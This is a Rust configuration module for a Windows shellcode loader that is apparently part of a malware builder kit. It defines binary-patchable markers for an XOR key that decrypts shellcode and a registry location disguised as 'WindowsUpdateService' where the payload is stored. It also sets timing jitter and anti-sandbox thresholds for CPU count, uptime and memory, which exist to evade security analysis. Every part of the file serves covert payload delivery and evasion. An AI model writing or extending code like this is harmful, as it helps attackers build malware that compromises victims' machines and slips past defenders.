//! Configuration module for the loader
//!
//! This module contains polymorphic configuration that changes with each deployment.
//! The XOR key and registry path are patched by the builder for each deployment.

// ============================================================================
// POLYMORPHIC CONFIGURATION (PATCHABLE)
// ============================================================================
// These values are replaced by the builder tool for each deployment
// The magic markers allow binary patching without recompilation

/// Magic marker to locate XOR key in binary (32 bytes marker + 32 bytes key)
/// Format: "C2R2_LOADER_XOR_KEY_PLACEHOLDER_" (32 bytes) + 32 bytes key = 64 bytes total
#[used]
#[no_mangle]
pub static LOADER_XOR_KEY_PADDED: [u8; 64] = *b"C2R2_LOADER_XOR_KEY_PLACEHOLDER_\x5b\x9e\x3d\xe2\x84\xc6\xaf\x58\x2b\x07\x94\x6e\x3a\xd5\x78\xbc\x4f\xa2\xe9\x65\x1d\xf3\x87\xca\x56\x20\xb4\x7e\x99\xd1\x63\x05";

/// Magic marker to locate registry key name in binary
/// Format: "C2R2_LOADER_REGKEY_PLACEHOLDER___" (32 bytes) + 64 bytes registry key name
#[used]
#[no_mangle]
pub static LOADER_REGKEY_PADDED: [u8; 96] = *b"C2R2_LOADER_REGKEY_PLACEHOLDER___WindowsUpdateService\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

/// Magic marker for registry value name
/// Format: "C2R2_LOADER_REGVAL_PLACEHOLDER___" (32 bytes) + 32 bytes value name
#[used]
#[no_mangle]
pub static LOADER_REGVAL_PADDED: [u8; 64] = *b"C2R2_LOADER_REGVAL_PLACEHOLDER___Data\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

/// Get XOR key for decrypting the shellcode (after the marker)
pub fn get_xor_key() -> &'static [u8] {
    &LOADER_XOR_KEY_PADDED[32..]
}

/// Get registry key name (after the marker, null-terminated)
pub fn get_registry_key() -> &'static str {
    let bytes = &LOADER_REGKEY_PADDED[32..];
    // Find null terminator
    let end = bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len());
    // SAFETY: Builder ensures valid UTF-8
    std::str::from_utf8(&bytes[..end]).unwrap_or("WindowsUpdateService")
}

/// Get registry value name (after the marker, null-terminated)
pub fn get_registry_value() -> &'static str {
    let bytes = &LOADER_REGVAL_PADDED[32..];
    let end = bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len());
    std::str::from_utf8(&bytes[..end]).unwrap_or("Data")
}

// ============================================================================
// JITTER CONFIGURATION
// ============================================================================

/// Minimum jitter delay in milliseconds
pub const JITTER_MIN_MS: u64 = 1000;

/// Maximum jitter delay in milliseconds
pub const JITTER_MAX_MS: u64 = 5000;

// ============================================================================
// ANTI-SANDBOX CONFIGURATION
// ============================================================================

/// Minimum CPU cores (sandboxes usually have 1-2)
pub const MIN_CPU_CORES: usize = 2;

/// Minimum uptime in milliseconds (3 minutes)
pub const MIN_UPTIME_MS: u64 = 180_000;

/// Minimum physical memory in bytes (4 GB)
pub const MIN_MEMORY_BYTES: u64 = 4 * 1024 * 1024 * 1024;
